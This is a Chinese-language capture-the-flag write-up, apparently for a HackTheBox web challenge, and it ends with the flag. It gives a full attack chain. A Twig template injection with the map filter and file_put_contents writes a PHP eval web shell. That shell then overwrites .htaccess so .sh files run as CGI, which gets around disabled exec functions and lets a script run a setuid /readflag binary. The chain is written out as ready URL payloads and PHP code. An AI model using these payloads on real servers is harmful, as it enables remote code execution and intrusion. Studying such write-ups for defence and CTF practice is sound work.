先看看附件，附件中的entrypoint.sh关掉了一堆可以执行命令的php函数，也禁止了putenv，没法劫持LD_PRELOAD

再来看看web页面，location参数一个很明显的twig模板注入，用map过滤器可以执行php代码，但是一定得是两个参数的php函数，所以先写shell：
http://192.168.205.128:1337/?location={{{%22%3C?php%20eval($_GET[0]);%22:%22test.php%22}|map(%27file_put_contents%27)}}

得到test。php

访问http://xxxxx:xxxx/test.php?0=echo+1;就可以看到回显

附件中flag在/root，www用户没权限进入，但是给了个setuid程序/readflag，setuid程序就是任意执行程序的用户都有程序所有者的权限，而这个readflag所有者是root，所以可以提权（作者的后门）
php可访问的目录被局限在/www
想办法获取执行程序的方法

exec等等都不行，但是httpd.conf中allowoverride all启用了，所以可以覆盖.htaccess来让一定后缀的文件被当作cgi脚本，这个文件我们可以用file_put_contents写的，然后调用/bin/sh去执行我们的后门

step1：
http://xxxxx:xxxx/test.php?0=urlencode(payload1)

payload1
```php
echo get_current_user();
file_put_contents(".htaccess","Options ExecCGI\nAddHandler cgi-script .sh\n");
```


step2：
http://xxxxx:xxxx/test.php?0=urlencode(payload2)
payload2
```php
echo get_current_user();
file_put_contents("exec.sh","#!/bin/sh\n\necho 'Content-Type: text/plain'\necho ''\n/readflag > /www/public/res.txt");
chmod("exec.sh",0777);
```

step3:
http://xxxxx:xxxx/exec.sh

step4:
http://xxxxx:xxxx/res.txt

HTB{byp4ss1ng_d1s4bl3d_fuNc7i0n5_and_0p3n_b4s3d1r_c4n_b3_s0_mund4n3}
